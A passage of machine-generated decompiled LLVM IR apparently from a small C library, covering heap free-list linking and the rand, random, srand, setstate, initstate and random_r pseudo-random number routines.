  %v1_1000f32c = add i32 %v0_1000f324.lcssa, 8
  %v2_1000f32c = inttoptr i32 %v1_1000f32c to i32*
  %v3_1000f32c = load i32, i32* %v2_1000f32c, align 4
  %v2_1000f334 = add i32 %v2_1000f324, %v2_1000f308
  store i32 %v2_1000f334, i32* @r29, align 4
  %v5_1000f338 = call i32 @__heap_link_free_area_after(i32* %arg1, i32 %v0_1000f330.lcssa, i32 %v3_1000f32c, i32 %v2_1000f2c4)
  store i32 %v5_1000f338, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f394

dec_label_pc_1000f340:                            ; preds = %dec_label_pc_1000f304
  %v1_1000f340 = add i32 %v0_1000f330.lcssa, 4
  %v2_1000f340 = inttoptr i32 %v1_1000f340 to i32*
  %v3_1000f340 = load i32, i32* %v2_1000f340, align 4
  %v3_1000f344 = icmp eq i32 %v3_1000f340, 0
  br i1 %v3_1000f344, label %dec_label_pc_1000f37c, label %dec_label_pc_1000f34c

dec_label_pc_1000f34c:                            ; preds = %dec_label_pc_1000f340
  %v1_1000f34c = inttoptr i32 %v3_1000f340 to i32*
  %v2_1000f34c = load i32, i32* %v1_1000f34c, align 4
  %v2_1000f350 = sub i32 %v3_1000f340, %v2_1000f34c
  %v1_1000f354 = add i32 %v2_1000f350, 12
  %v4_1000f358 = icmp eq i32 %v2_1000f2c4, %v1_1000f354
  br i1 %v4_1000f358, label %dec_label_pc_1000f360, label %dec_label_pc_1000f37c

dec_label_pc_1000f360:                            ; preds = %dec_label_pc_1000f34c
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_1000f36c = add i32 %v2_1000f34c, %v2_1000f308
  store i32 %v2_1000f36c, i32* @r29, align 4
  store i32 %v3_1000f340, i32* @r31, align 4
  %v5_1000f374 = call i32 @__heap_link_free_area_after(i32* %arg1, i32 %v3_1000f340, i32 %v0_1000f324.lcssa, i32 %v2_1000f2c4)
  store i32 %v5_1000f374, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f394

dec_label_pc_1000f37c:                            ; preds = %dec_label_pc_1000f34c, %dec_label_pc_1000f340
  %v2_1000f37c = add i32 %v0_1000f330.lcssa, %arg3
  store i32 %v2_1000f37c, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268497812, i32* @lr, align 4
  %v5_1000f390 = call i32 @__heap_link_free_area(i32* %arg1, i32 %v2_1000f37c, i32 %v0_1000f324.lcssa, i32 %v3_1000f340)
  store i32 %v5_1000f390, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f394

dec_label_pc_1000f394:                            ; preds = %dec_label_pc_1000f318, %dec_label_pc_1000f310, %dec_label_pc_1000f360, %dec_label_pc_1000f324, %dec_label_pc_1000f37c
  %v0_1000f394 = load i32, i32* @r31, align 4
  store i32 %v0_1000f394, i32* @r30, align 4
  %v0_1000f398 = load i32, i32* @r29, align 4
  %v2_1000f398 = inttoptr i32 %v0_1000f394 to i32*
  store i32 %v0_1000f398, i32* %v2_1000f398, align 4
  br label %dec_label_pc_1000f3bc

dec_label_pc_1000f3a0:                            ; preds = %dec_label_pc_1000f2f0, %dec_label_pc_1000f2e8
  %v2_1000f3a0 = add i32 %v2_1000f2c4, -12
  %v3_1000f3a0 = inttoptr i32 %v2_1000f3a0 to i32*
  store i32 %arg3, i32* %v3_1000f3a0, align 4
  %v0_1000f3a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000f3a4 = add i32 %v0_1000f3a4, -12
  store i32 %v1_1000f3a4, i32* @r30, align 4
  %v0_1000f3a8 = load i32, i32* %r11.global-to-local, align 4
  %v0_1000f3ac = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_1000f3ac, i32* %r3.global-to-local, align 4
  %v0_1000f3b0 = load i32, i32* @r31, align 4
  store i32 268497852, i32* @lr, align 4
  %v4_1000f3b8 = inttoptr i32 %v0_1000f3ac to i32*
  %v5_1000f3b8 = call i32 @__heap_link_free_area(i32* %v4_1000f3b8, i32 %v1_1000f3a4, i32 %v0_1000f3a8, i32 %v0_1000f3b0)
  store i32 %v5_1000f3b8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f3bc

dec_label_pc_1000f3bc:                            ; preds = %dec_label_pc_1000f394, %dec_label_pc_1000f3a0
  %v0_1000f3c0 = load i32, i32* @r30, align 4
  store i32 %v0_1000f3c0, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000f3c0

; uselistorder directives
  uselistorder i32 %v3_1000f340, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_1000f2f8, { 1, 0 }
  uselistorder i32 %v0_1000f330.lcssa, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_1000f324.lcssa, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %v3_1000f2d4, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v2_1000f2c4, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %tmp, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 4, 8, 10, 5, 2, 6, 11, 7, 9, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 0, 2 }
  uselistorder i32 -12, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32* %arg1, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_1000f3bc, { 1, 0 }
  uselistorder label %dec_label_pc_1000f394, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1000f2d0, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_1000f3d4 = call i32 @random()
  ret i32 %v0_1000f3d4

; uselistorder directives
  uselistorder i32 ()* @random, { 7, 6, 0, 1, 2, 3, 4, 5 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v2_1000f3ec = ptrtoint i32* %stack_var_-52 to i32
  store i32 ptrtoint (i32* @global_var_1002b7a0.770 to i32), i32* @r29, align 4
  store i32 %v2_1000f3ec, i32* @r3, align 4
  %v0_1000f404 = call i32 @__pthread_return_void()
  %v0_1000f40c = call i32 @__pthread_return_0()
  %v2_1000f414 = ptrtoint i32* %stack_var_-56 to i32
  %v3_1000f41c = call i32 @__GI_random_r(i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 -18504) to i32*), i32 %v2_1000f414)
  store i32 %v2_1000f3ec, i32* @r3, align 4
  %v0_1000f428 = call i32 @__pthread_return_void()
  %v3_1000f430 = load i32, i32* %stack_var_-56, align 4
  ret i32 %v3_1000f430
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1002b7a0.770 to i32), i32* %r29.global-to-local, align 4
  %v2_1000f468 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000f468, i32* @r3, align 4
  %v0_1000f470 = call i32 @__pthread_return_void()
  %v0_1000f478 = call i32 @__pthread_return_0()
  store i32 268498068, i32* @lr, align 4
  %v3_1000f490 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_1002b7b8)
  store i32 0, i32* %r29.global-to-local, align 4
  %v1_1000f498 = icmp slt i32 %v3_1000f490, 0
  store i32 %v2_1000f468, i32* @r3, align 4
  br i1 %v1_1000f498, label %dec_label_pc_1000f4ac, label %dec_label_pc_1000f4a8

dec_label_pc_1000f4a8:                            ; preds = %entry
  store i32 ptrtoint (i32** @global_var_1002b7bc.774 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000f4ac

dec_label_pc_1000f4ac:                            ; preds = %entry, %dec_label_pc_1000f4a8
  %v0_1000f4ac = call i32 @__pthread_return_void()
  %v0_1000f4b4 = load i32, i32* %r29.global-to-local, align 4
  ret i32 %v0_1000f4b4

; uselistorder directives
  uselistorder i32* %r29.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000f4ac, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %v2_1000f4d8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000f4d8, i32* @r3, align 4
  %v0_1000f500 = call i32 @__pthread_return_void()
  %v0_1000f508 = call i32 @__pthread_return_0()
  store i32 %arg1, i32* @r3, align 4
  store i32 268498216, i32* @lr, align 4
  %v4_1000f524 = inttoptr i32 %arg1 to i32*
  %v5_1000f524 = call i32 @__GI_initstate_r(i32* %v4_1000f524, i32 %arg2, i32 %arg3, i32 ptrtoint (i32* @global_var_1002b7b8 to i32))
  store i32 %v2_1000f4d8, i32* @r3, align 4
  %v0_1000f530 = call i32 @__pthread_return_void()
  ret i32 ptrtoint (i32** @global_var_1002b7bc.774 to i32)

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1000f564 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000f564, i32* @r3, align 4
  %v0_1000f580 = call i32 @__pthread_return_void()
  %v0_1000f588 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32* @global_var_1002b7b8 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 268498332, i32* @lr, align 4
  %v0_1000f598 = call i32 @srandom_r()
  store i32 %v2_1000f564, i32* @r3, align 4
  %v0_1000f5a4 = call i32 @__pthread_return_void()
  ret i32 %v0_1000f5a4

; uselistorder directives
  uselistorder i32* @global_var_1002b7b8, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002b7b8 to i32), { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_1000f5bc = add i32 %tmp, 12
  %v2_1000f5bc = inttoptr i32 %v1_1000f5bc to i32*
  %v3_1000f5bc = load i32, i32* %v2_1000f5bc, align 4
  store i32 %v3_1000f5bc, i32* %r11.global-to-local, align 4
  %v0_1000f5c0 = load i32, i32* @lr, align 4
  store i32 %v0_1000f5c0, i32* %r0.global-to-local, align 4
  %v1_1000f5c8 = add i32 %arg1, 4
  store i32 %v1_1000f5c8, i32* %r3.global-to-local, align 4
  %v3_1000f5cc = icmp eq i32 %v3_1000f5bc, 0
  %v1_1000f5d0 = add i32 %tmp, 8
  %v2_1000f5d0 = inttoptr i32 %v1_1000f5d0 to i32*
  %v3_1000f5d0 = load i32, i32* %v2_1000f5d0, align 4
  store i32 %v3_1000f5d0, i32* %r9.global-to-local, align 4
  br i1 %v3_1000f5cc, label %dec_label_pc_1000f5dc, label %dec_label_pc_1000f5e4

dec_label_pc_1000f5dc:                            ; preds = %entry
  %v2_1000f5dc = add i32 %v3_1000f5d0, -4
  %v3_1000f5dc = inttoptr i32 %v2_1000f5dc to i32*
  store i32 0, i32* %v3_1000f5dc, align 4
  br label %dec_label_pc_1000f5fc

dec_label_pc_1000f5e4:                            ; preds = %entry
  %v1_1000f5e4 = add i32 %tmp, 4
  %v2_1000f5e4 = inttoptr i32 %v1_1000f5e4 to i32*
  %v3_1000f5e4 = load i32, i32* %v2_1000f5e4, align 4
  %v2_1000f5e8 = sub i32 %v3_1000f5e4, %v3_1000f5d0
  %v4_1000f5ec = sdiv i32 %v2_1000f5e8, 4
  %v1_1000f5f0 = mul i32 %v4_1000f5ec, 5
  %v2_1000f5f4 = add i32 %v1_1000f5f0, %v3_1000f5bc
  store i32 %v2_1000f5f4, i32* %r0.global-to-local, align 4
  %v2_1000f5f8 = add i32 %v3_1000f5d0, -4
  %v3_1000f5f8 = inttoptr i32 %v2_1000f5f8 to i32*
  store i32 %v2_1000f5f4, i32* %v3_1000f5f8, align 4
  br label %dec_label_pc_1000f5fc

dec_label_pc_1000f5fc:                            ; preds = %dec_label_pc_1000f5dc, %dec_label_pc_1000f5e4
  %v0_1000f5fc = load i32, i32* %r3.global-to-local, align 4
  %v1_1000f5fc = add i32 %v0_1000f5fc, -4
  %v2_1000f5fc = inttoptr i32 %v1_1000f5fc to i32*
  %v3_1000f5fc = load i32, i32* %v2_1000f5fc, align 4
  store i32 5, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001a0f4.775 to i32), i32* %r9.global-to-local, align 4
  %v2_1000f60c = srem i32 %v3_1000f5fc, 5
  store i32 %v2_1000f60c, i32* %r11.global-to-local, align 4
  %v2_1000f61c = icmp ugt i32 %v2_1000f60c, 4
  %v1_1000f620 = mul nsw i32 %v2_1000f60c, 4
  store i32 %v1_1000f620, i32* %r0.global-to-local, align 4
  %v2_1000f628 = add i32 %v1_1000f620, ptrtoint (i32* @global_var_1001a0f4.775 to i32)
  store i32 %v2_1000f628, i32* %r10.global-to-local, align 4
  br i1 %v2_1000f61c, label %dec_label_pc_1000f68c, label %dec_label_pc_1000f630

dec_label_pc_1000f630:                            ; preds = %dec_label_pc_1000f5fc
  %v3_1000f624 = icmp eq i32 %v2_1000f60c, 0
  %v1_1000f630 = add i32 %v1_1000f620, add (i32 ptrtoint (i32* @global_var_1001a0f4.775 to i32), i32 20)
  %v2_1000f630 = inttoptr i32 %v1_1000f630 to i32*
  %v3_1000f630 = load i32, i32* %v2_1000f630, align 4
  store i32 %v3_1000f630, i32* %r10.global-to-local, align 4
  %v3_1000f634 = inttoptr i32 %v2_1000f628 to i32*
  %v4_1000f634 = load i32, i32* %v3_1000f634, align 4
  store i32 %v4_1000f634, i32* %r9.global-to-local, align 4
  %v1_1000f638 = mul i32 %v3_1000f630, 4
  store i32 %v1_1000f638, i32* %r0.global-to-local, align 4
  %v2_1000f63c = add i32 %tmp, 16
  %v3_1000f63c = inttoptr i32 %v2_1000f63c to i32*
  store i32 %v3_1000f630, i32* %v3_1000f63c, align 4
  %v0_1000f640 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000f640 = add i32 %tmp, 20
  %v3_1000f640 = inttoptr i32 %v2_1000f640 to i32*
  store i32 %v0_1000f640, i32* %v3_1000f640, align 4
  %v0_1000f644 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000f644 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000f644 = add i32 %v1_1000f644, %v0_1000f644
  store i32 %v2_1000f644, i32* %r8.global-to-local, align 4
  %v0_1000f648 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000f648, i32* %v2_1000f5bc, align 4
  br i1 %v3_1000f624, label %dec_label_pc_1000f680, label %dec_label_pc_1000f650

dec_label_pc_1000f650:                            ; preds = %dec_label_pc_1000f630
  %v0_1000f650 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000f650 = add i32 %v0_1000f650, -4
  %v2_1000f650 = inttoptr i32 %v1_1000f650 to i32*
  %v3_1000f650 = load i32, i32* %v2_1000f650, align 4
  %v1_1000f654 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000f654 = sdiv i32 %v3_1000f650, %v1_1000f654
  %v1_1000f658 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000f658 = add i32 %v1_1000f658, %v2_1000f654
  store i32 %v2_1000f658, i32* %r9.global-to-local, align 4
  %v1_1000f65c = mul i32 %v2_1000f654, 4
  %v1_1000f660 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000f660 = sdiv i32 %v2_1000f658, %v1_1000f660
  store i32 %v2_1000f660, i32* %r11.global-to-local, align 4
  %v2_1000f664 = add i32 %v1_1000f65c, %v0_1000f650
  store i32 %v2_1000f664, i32* %r0.global-to-local, align 4
  %v2_1000f668 = add i32 %tmp, 4
  %v3_1000f668 = inttoptr i32 %v2_1000f668 to i32*
  store i32 %v2_1000f664, i32* %v3_1000f668, align 4
  %v0_1000f66c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f66c = load i32, i32* %r10.global-to-local, align 4
  %v2_1000f66c = mul i32 %v1_1000f66c, %v0_1000f66c
  store i32 %v2_1000f66c, i32* %r11.global-to-local, align 4
  %v1_1000f670 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000f670 = sub i32 %v1_1000f670, %v2_1000f66c
  %v1_1000f674 = mul i32 %v2_1000f670, 4
  %v0_1000f678 = load i32, i32* %r3.global-to-local, align 4
  %v2_1000f678 = add i32 %v1_1000f674, %v0_1000f678
  store i32 %v2_1000f678, i32* %r9.global-to-local, align 4
  store i32 %v2_1000f678, i32* %arg2, align 4
  br label %dec_label_pc_1000f680

dec_label_pc_1000f680:                            ; preds = %dec_label_pc_1000f630, %dec_label_pc_1000f650
  %v0_1000f680 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000f680 = add i32 %tmp, 24
  %v3_1000f680 = inttoptr i32 %v2_1000f680 to i32*
  store i32 %v0_1000f680, i32* %v3_1000f680, align 4
  %v0_1000f684 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1000f684, i32* %v2_1000f5d0, align 4
  %v0_1000f6a0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000f69c

dec_label_pc_1000f68c:                            ; preds = %dec_label_pc_1000f5fc
  %v0_1000f68c = call i32 @__errno_location()
  store i32 %v0_1000f68c, i32* %r3.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_1000f694 = inttoptr i32 %v0_1000f68c to i32*
  store i32 22, i32* %v2_1000f694, align 4
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000f69c

dec_label_pc_1000f69c:                            ; preds = %dec_label_pc_1000f680, %dec_label_pc_1000f68c
  %v0_1000f6a0 = phi i32 [ %v0_1000f6a0.pre, %dec_label_pc_1000f680 ], [ -1, %dec_label_pc_1000f68c ]
  store i32 %v0_1000f5c0, i32* %r0.global-to-local, align 4
  store i32 %v0_1000f6a0, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000f6a0

; uselistorder directives
  uselistorder i32 %v0_1000f6a0, { 1, 0 }
  uselistorder i32 %v3_1000f630, { 1, 0, 2 }
  uselistorder i32 %v1_1000f620, { 2, 1, 0 }
  uselistorder i32 %v2_1000f60c, { 3, 0, 2, 1 }
  uselistorder i32 %tmp, { 0, 2, 6, 4, 5, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 8, 0 }
  uselistorder label %dec_label_pc_1000f69c, { 1, 0 }
  uselistorder label %dec_label_pc_1000f680, { 1, 0 }
  uselistorder label %dec_label_pc_1000f5fc, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_1000f6b0 = add i32 %tmp, 12
  %v2_1000f6b0 = inttoptr i32 %v1_1000f6b0 to i32*
  %v3_1000f6b0 = load i32, i32* %v2_1000f6b0, align 4
  %v1_1000f6bc = add i32 %tmp, 8
  %v2_1000f6bc = inttoptr i32 %v1_1000f6bc to i32*
  %v3_1000f6bc = load i32, i32* %v2_1000f6bc, align 4
  store i32 %v3_1000f6bc, i32* %r7.global-to-local, align 4
  %v3_1000f6c0 = icmp eq i32 %v3_1000f6b0, 0
  br i1 %v3_1000f6c0, label %dec_label_pc_1000f6c8, label %dec_label_pc_1000f6e4

dec_label_pc_1000f6c8:                            ; preds = %entry
  %v1_1000f6c8 = inttoptr i32 %v3_1000f6bc to i32*
  %v2_1000f6c8 = load i32, i32* %v1_1000f6c8, align 4
  %v2_1000f6cc = mul i32 %v2_1000f6c8, 1103515245
  %v1_1000f6d0 = add i32 %v2_1000f6cc, 12345
  %v1_1000f6d4 = urem i32 %v1_1000f6d0, -2147483648
  store i32 %v1_1000f6d4, i32* %r9.global-to-local, align 4
  store i32 %v1_1000f6d4, i32* %v1_1000f6c8, align 4
  %v0_1000f6dc = load i32, i32* %r9.global-to-local, align 4
  %v2_1000f6dc = inttoptr i32 %arg2 to i32*
  store i32 %v0_1000f6dc, i32* %v2_1000f6dc, align 4
  br label %dec_label_pc_1000f738

dec_label_pc_1000f6e4:                            ; preds = %entry
  %v2_1000f6e4 = load i32, i32* %arg1, align 4
  %v1_1000f6e8 = add i32 %tmp, 4
  %v2_1000f6e8 = inttoptr i32 %v1_1000f6e8 to i32*
  %v3_1000f6e8 = load i32, i32* %v2_1000f6e8, align 4
  store i32 %v3_1000f6e8, i32* %r9.global-to-local, align 4
  %v1_1000f6ec = add i32 %tmp, 24
  %v2_1000f6ec = inttoptr i32 %v1_1000f6ec to i32*
  %v3_1000f6ec = load i32, i32* %v2_1000f6ec, align 4
  %v1_1000f6f0 = add i32 %v2_1000f6e4, 4
  store i32 %v1_1000f6f0, i32* %r8.global-to-local, align 4
  %v1_1000f6f4 = add i32 %v3_1000f6e8, 4
  %v1_1000f6f8 = inttoptr i32 %v3_1000f6e8 to i32*
  %v2_1000f6f8 = load i32, i32* %v1_1000f6f8, align 4
  store i32 %v2_1000f6f8, i32* %r9.global-to-local, align 4
  %v2_1000f6fc = icmp ult i32 %v1_1000f6f0, %v3_1000f6ec
  %v1_1000f704 = inttoptr i32 %v2_1000f6e4 to i32*
  %v2_1000f704 = load i32, i32* %v1_1000f704, align 4
  store i32 %v1_1000f6f4, i32* %r10.global-to-local, align 4
  %v2_1000f70c = add i32 %v2_1000f704, %v2_1000f6f8
  %v1_1000f710 = udiv i32 %v2_1000f70c, 2
  store i32 %v1_1000f710, i32* %r9.global-to-local, align 4
  store i32 %v2_1000f70c, i32* %v1_1000f704, align 4
  %v0_1000f718 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000f718 = inttoptr i32 %arg2 to i32*
  store i32 %v0_1000f718, i32* %v2_1000f718, align 4
  br i1 %v2_1000f6fc, label %dec_label_pc_1000f728, label %dec_label_pc_1000f720

dec_label_pc_1000f720:                            ; preds = %dec_label_pc_1000f6e4
  %v0_1000f720 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1000f720, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000f730

dec_label_pc_1000f728:                            ; preds = %dec_label_pc_1000f6e4
  %v2_1000f700 = icmp ult i32 %v1_1000f6f4, %v3_1000f6ec
  br i1 %v2_1000f700, label %dec_label_pc_1000f730, label %dec_label_pc_1000f72c

dec_label_pc_1000f72c:                            ; preds = %dec_label_pc_1000f728
  %v0_1000f72c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1000f72c, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000f730

dec_label_pc_1000f730:                            ; preds = %dec_label_pc_1000f728, %dec_label_pc_1000f720, %dec_label_pc_1000f72c
  %v0_1000f730 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_1000f730, i32* %v2_1000f6e8, align 4
  %v0_1000f734 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1000f734, i32* %arg1, align 4
  br label %dec_label_pc_1000f738

dec_label_pc_1000f738:                            ; preds = %dec_label_pc_1000f6c8, %dec_label_pc_1000f730
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_1000f70c, { 1, 0 }
  uselistorder i32 %v1_1000f6f4, { 1, 0 }
  uselistorder i32 %v3_1000f6e8, { 1, 0, 2 }
  uselistorder i32 %v1_1000f6d4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 2, 0, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000f738, { 1, 0 }
  uselistorder label %dec_label_pc_1000f730, { 2, 0, 1 }
}

define i32 @srandom_r() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1000f740 = load i32, i32* @lr, align 4
  %v0_1000f74c = load i32, i32* @r4, align 4
  store i32 %v0_1000f74c, i32* @r30, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_1000f758 = add i32 %v0_1000f74c, 12
  %v2_1000f758 = inttoptr i32 %v1_1000f758 to i32*
  %v3_1000f758 = load i32, i32* %v2_1000f758, align 4
  %v2_1000f75c = icmp ugt i32 %v3_1000f758, 4
  br i1 %v2_1000f75c, label %dec_label_pc_1000f80c, label %dec_label_pc_1000f764

dec_label_pc_1000f764:                            ; preds = %entry
  %v0_1000f764 = load i32, i32* @r3, align 4
  %v3_1000f764 = icmp eq i32 %v0_1000f764, 0
  %v1_1000f768 = add i32 %v0_1000f74c, 8
  %v2_1000f768 = inttoptr i32 %v1_1000f768 to i32*
  %v3_1000f768 = load i32, i32* %v2_1000f768, align 4
  store i32 %v3_1000f768, i32* %r10.global-to-local, align 4
  br i1 %v3_1000f764, label %dec_label_pc_1000f770, label %dec_label_pc_1000f774

dec_label_pc_1000f770:                            ; preds = %dec_label_pc_1000f764
  store i32 1, i32* @r3, align 4
  br label %dec_label_pc_1000f774

dec_label_pc_1000f774:                            ; preds = %dec_label_pc_1000f764, %dec_label_pc_1000f770
  %v0_1000f778 = phi i32 [ %v0_1000f764, %dec_label_pc_1000f764 ], [ 1, %dec_label_pc_1000f770 ]
  %v3_1000f774 = icmp eq i32 %v3_1000f758, 0
  %v2_1000f778 = inttoptr i32 %v3_1000f768 to i32*
  store i32 %v0_1000f778, i32* %v2_1000f778, align 4
  br i1 %v3_1000f774, label %dec_label_pc_1000f808, label %dec_label_pc_1000f780

dec_label_pc_1000f780:                            ; preds = %dec_label_pc_1000f774
  %v0_1000f780 = load i32, i32* @r30, align 4
  %v1_1000f780 = add i32 %v0_1000f780, 16
  %v2_1000f780 = inttoptr i32 %v1_1000f780 to i32*
  %v3_1000f780 = load i32, i32* %v2_1000f780, align 4
  store i32 %v3_1000f780, i32* %r11.global-to-local, align 4
  store i32 127773, i32* %r8.global-to-local, align 4
  store i32 2147483647, i32* %r7.global-to-local, align 4
  %v0_1000f798 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v3_1000f780, i32* %ctr.global-to-local, align 4
  %tmp18 = icmp sgt i32 %v3_1000f780, 0
  br i1 %tmp18, label %dec_label_pc_1000f7d4.preheader, label %dec_label_pc_1000f7d4.preheader.thread

dec_label_pc_1000f7d4.preheader.thread:           ; preds = %dec_label_pc_1000f780
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000f7d8

dec_label_pc_1000f7d4.preheader:                  ; preds = %dec_label_pc_1000f780
  %v1_1000f7d42 = add i32 %v3_1000f780, -1
  store i32 %v1_1000f7d42, i32* %ctr.global-to-local, align 4
  %v2_1000f7d43 = icmp eq i32 %v1_1000f7d42, 0
  br i1 %v2_1000f7d43, label %dec_label_pc_1000f7d8, label %dec_label_pc_1000f7b0

dec_label_pc_1000f7b0:                            ; preds = %dec_label_pc_1000f7d4.preheader, %dec_label_pc_1000f7d0.dec_label_pc_1000f7b0_crit_edge
  %v1_1000f7d0 = phi i32 [ %v2_1000f7d0, %dec_label_pc_1000f7d0.dec_label_pc_1000f7b0_crit_edge ], [ %v0_1000f798, %dec_label_pc_1000f7d4.preheader ]
  %v1_1000f7b0 = phi i32 [ %v1_1000f7b0.pre, %dec_label_pc_1000f7d0.dec_label_pc_1000f7b0_crit_edge ], [ 127773, %dec_label_pc_1000f7d4.preheader ]
  %v0_1000f7b0 = load i32, i32* @r3, align 4
  %v2_1000f7b0 = sdiv i32 %v0_1000f7b0, %v1_1000f7b0
  %v2_1000f7b4 = mul i32 %v2_1000f7b0, %v1_1000f7b0
  %v2_1000f7b8 = sub i32 %v0_1000f7b0, %v2_1000f7b4
  %v1_1000f7bc = mul i32 %v2_1000f7b0, 2836
  store i32 %v1_1000f7bc, i32* %r0.global-to-local, align 4
  %v1_1000f7c0 = mul i32 %v2_1000f7b8, 16807
  %v2_1000f7c4 = sub i32 %v1_1000f7c0, %v1_1000f7bc
  store i32 %v2_1000f7c4, i32* @r3, align 4
  %tmp19 = icmp sgt i32 %v2_1000f7c4, -1
  br i1 %tmp19, label %dec_label_pc_1000f7d0, label %dec_label_pc_1000f7cc

dec_label_pc_1000f7cc:                            ; preds = %dec_label_pc_1000f7b0
  %v1_1000f7cc = load i32, i32* %r7.global-to-local, align 4
  %v2_1000f7cc = add i32 %v1_1000f7cc, %v2_1000f7c4
  store i32 %v2_1000f7cc, i32* @r3, align 4
  br label %dec_label_pc_1000f7d0

dec_label_pc_1000f7d0:                            ; preds = %dec_label_pc_1000f7b0, %dec_label_pc_1000f7cc
  %v0_1000f7d0 = phi i32 [ %v2_1000f7c4, %dec_label_pc_1000f7b0 ], [ %v2_1000f7cc, %dec_label_pc_1000f7cc ]
  %v2_1000f7d0 = add i32 %v1_1000f7d0, 4
